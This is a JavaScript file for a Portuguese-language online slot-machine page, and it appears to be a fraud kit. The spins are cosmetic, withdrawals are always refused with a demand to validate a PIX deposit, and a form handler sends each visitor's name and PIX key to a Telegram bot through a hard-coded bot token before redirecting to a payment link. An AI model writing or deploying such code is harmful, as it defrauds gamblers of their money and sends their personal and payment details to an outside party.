const TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
const CHAT_ID = "6238676644";
const simbolos = ["🐯", "💰", "🍊", "🎆", "💎"];

window.girarSlots = () => {
    const reels = [document.getElementById("reel-0"), document.getElementById("reel-1"), document.getElementById("reel-2")];
    
    // Efeito de movimento rápido
    let giros = 0;
    const intervalo = setInterval(() => {
        reels.forEach(r => r.innerText = simbolos[Math.floor(Math.random() * simbolos.length)]);
        giros++;
        if (giros > 10) {
            clearInterval(intervalo);
            // Sorteia o resultado final
            reels.forEach(r => r.innerText = simbolos[Math.floor(Math.random() * simbolos.length)]);
        }
    }, 100);
};

window.alterarAposta = (valor) => {
    const display = document.getElementById("valor-aposta");
    let atual = parseFloat(display.innerText.replace("R$ ", "").replace(",", "."));
    let novo = atual + (valor * 2.00);
    if (novo < 2.00) novo = 2.00;
    display.innerText = `R$ ${novo.toFixed(2).replace(".", ",")}`;
};

window.abrirModal = () => document.getElementById("modal").style.display = "flex";
window.fecharModal = () => document.getElementById("modal").style.display = "none";

window.enviarDados = () => {
    const nome = document.getElementById("nome-usuario").value;
    const chave = document.getElementById("pix-chave-fixa").value;
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: `Novo Depósito!\nNome: ${nome}\nChave: ${chave}` })
    }).then(() => window.location.href = "https://go.tribopay.com.br/w3p787fphj");
};

window.sacar = () => alert("Saque bloqueado. Valide seu depósito via PIX.");
